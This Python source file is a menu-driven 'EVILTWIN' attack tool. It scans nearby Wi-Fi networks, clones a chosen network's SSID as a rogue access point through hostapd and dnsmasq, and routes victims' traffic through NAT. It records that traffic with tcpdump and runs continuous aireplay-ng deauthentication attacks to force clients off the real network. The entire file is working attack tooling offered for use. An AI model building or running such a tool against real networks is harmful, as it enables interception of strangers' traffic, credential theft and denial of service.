import os
import sys
import json
import csv
from simple_term_menu import TerminalMenu
from tabulate import tabulate
from subprocess import call
from termcolor import colored

with open("conf/local.json") as json_data_file:
	data = json.load(json_data_file)

sys.path.append(data["pathSRC"])
import settings
from deauth import *

def shell(command):
	stream = os.popen(command)
	return stream.read()

def cls():
	os.system('cls' if os.name=='nt' else 'clear')

def displayMenu():
	cls()
	shell('clear')
	print(shell("figlet EVILTWIN"))
	print("Interface AP :", colored(settings.globals["interfaceAP"], 'red'))
	print("Interface Internet :", colored(settings.globals["interfaceInternet"], 'red'))
	print("Interface DeAuth :", colored(settings.globals["interfaceDeauth"], 'red'))
	print("Selected WIFI :", colored(settings.globals["targetWifi"], 'red'))
	print("bssid :", colored(settings.globals["bssid"], 'red'))
	print("channel :", colored(settings.globals["channel"], 'red'))
	if settings.globals["capture"] == 'OFF':
		print("Capture Packets : ", '\x1b[0;37;41m' + settings.globals["capture"] + '\x1b[0m', "\n")
	else:
		print("Capture Packets : ", '\x1b[6;30;42m' + settings.globals["capture"] + '\x1b[0m', "\n")	
	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Deauthentification Setup", "Start/Stop Packets capture", "Start/Stop Deauthentification Attack", "Exit"]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()
	match menu_entry_index:
		case 0:
			displayInterfaceMenu()
		case 1:
			displaySelectTargetType()
		case 2:
			startTwin()
		case 3:
			displaySelectDevice()
		case 4:
			capturePackets(settings.globals["interfaceAP"])
		case 5:
			deauthAttack(settings.globals["interfaceAP"], settings.globals["bssid"], settings.globals["deviceMAC"])
		case 6:
			return False
	return True

def displayInterfaceMenu():
	options = ["Select Interface AP", "Select Interface Internet", "Select Interface Deauth", "Exit"]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()

	match menu_entry_index:
		case 0:
			displayInterfaceNames('interfaceAP')
		case 1:
			displayInterfaceNames('interfaceInternet')
			firewallRouting(settings.globals["interfaceInternet"])
		case 2:
			displayInterfaceNames('interfaceDeauth')
		case 3:
			return False
	return True

def displayInterfaceNames(interface):
	options = shell("ip -o link show | awk -F': ' '{print $2}'").split("\n")
	del options[-1]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()
	settings.globals[interface] = options[menu_entry_index]

def print_array(array):
	for row in array:
		print(row)

def airoScan(wlan):
	shell("rm res/targetAP/*")
	shell("airodump-ng " + wlan + " -w res/targetAP/captures & sleep 10; pkill airodump")

def firewallRouting(wlan):
	shell("echo 1 > /proc/sys/net/ipv4/ip_forward") #MODE FORWARD
	shell("iptables -F")
	shell("iptables -X")
	shell("iptables -I POSTROUTING -t nat -o " + wlan + " -j MASQUERADE")

def dnsmasqServerInit(wlan):
	shell("ip addr add 192.168.1.1/24 dev " + wlan)
	with open('conf/confDnsmasq.txt', 'w') as f:
		f.write('interface=' + wlan + '\n')
		f.write('dhcp-range=192.168.1.50,192.168.1.150,12h\n')
		f.write('dhcp-option=6,8.8.8.8\n')
		f.write('dhcp-option=3,192.168.1.1\n')

def dnsmasqServer():
	#shell("dnsmasq -d -C " + file)
	call(["gnome-terminal", "-x", "sh", "-c", "dnsmasq -d -C conf/confDnsmasq.txt; bash"])

def rogueApStart(wlan):
	shell("airmon-ng start " + wlan)

def hostapdInit(wlan, ssid):
	with open('conf/confRogueAP.txt', 'w') as f:
		f.write('interface=' + wlan + '\n')
		f.write('ssid=' + ssid + '\n')
		f.write('hw_mode=g\n')
		f.write('channel=3')

def hostapdEnable():
	#shell('hostapd confRogueAP')
	call(["gnome-terminal", "-x", "sh", "-c", "hostapd conf/confRogueAP.txt; bash"])

def deAuth(wlan, bssid, MacDevice):
	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)

def getAps():
    accessPoints = {"header" : [], "aps" : []}
    with open("res/targetAP/captures-01.csv", "r") as file:
        reader = csv.reader(file)
        for row in reader:
            accessPoints["aps"].append(row)

    # Set header, and remove it from aps array
    accessPoints["aps"].pop(0)
    accessPoints["header"] = accessPoints["aps"][0]
    accessPoints["aps"].pop(0)

    # Remove second part of aps infos
    index = None
    for i, ap in enumerate(accessPoints["aps"]):
        if not ap:
            index = i
            break

    del accessPoints["aps"][index:]

    return accessPoints

def displaySelectTargetType():
	terminal_menu = TerminalMenu(menu_entries = ["Automatic", "Manual", "Exit"])
	entry_index = terminal_menu.show()
	match entry_index:
		case 0:
			automaticSelectTarget()
		case 1:
			displaySelectTarget()
		case 2:
			return

def automaticSelectTarget():
	#airoScan(settings.globals["interfaceAP"])
	aps = getAps()
	print_array(aps["aps"])

	for i in range(len(aps["aps"])):
		current = aps["aps"][i]
		max = current
		if max[10] > current[10]:
			max = current
	settings.globals["targetWifi"] = max[13].lstrip()
	settings.globals["bssid"] = max[0].lstrip()
	settings.globals["channel"] = max[3].lstrip()

def displaySelectTarget():
	#airoScan(settings.globals["interfaceAP"])
	aps = getAps()
	options = tabulate(aps["aps"], headers=aps["header"])
	headers = options.split("\n")[0:2]
	headers = "\n".join(headers)
	items = options.split("\n")[2:]
	terminal_menu = TerminalMenu(menu_entries = items, title = headers)
	menu_entry_index = terminal_menu.show()
	selectedTarget = aps["aps"][menu_entry_index]
	settings.globals["targetWifi"] = selectedTarget[13].lstrip()
	settings.globals["bssid"] = selectedTarget[0].lstrip()
	settings.globals["channel"] = selectedTarget[3].lstrip()
	hostapdInit(settings.globals["interfaceAP"], settings.globals["targetWifi"])

def startTwin():
	dnsmasqServerInit(settings.globals["interfaceAP"])
	dnsmasqServer()
	hostapdEnable()

def capturePackets(wlan):
	if settings.globals["capture"] == 'OFF':
		settings.globals["capture"] = 'ON'
		call(["gnome-terminal", "-x", "sh", "-c", "tcpdump -i " + wlan + " -s 65535 -w res/tcpDump/dataCaptured.pcap; bash"])
	else:
		settings.globals["capture"] = 'OFF'
		shell("pkill tcpdump")

def deauthAttack(wlan, bssid, deviceMAC):
	if settings.globals["deviceMAC"] is not None:
		call(["gnome-terminal", "-x", "sh", "-c", "aireplay-ng -0 0 -a " + bssid + "  -c " + deviceMAC + ' ' + wlan + "; bash"])
	else:
		shell("pkill airodump")
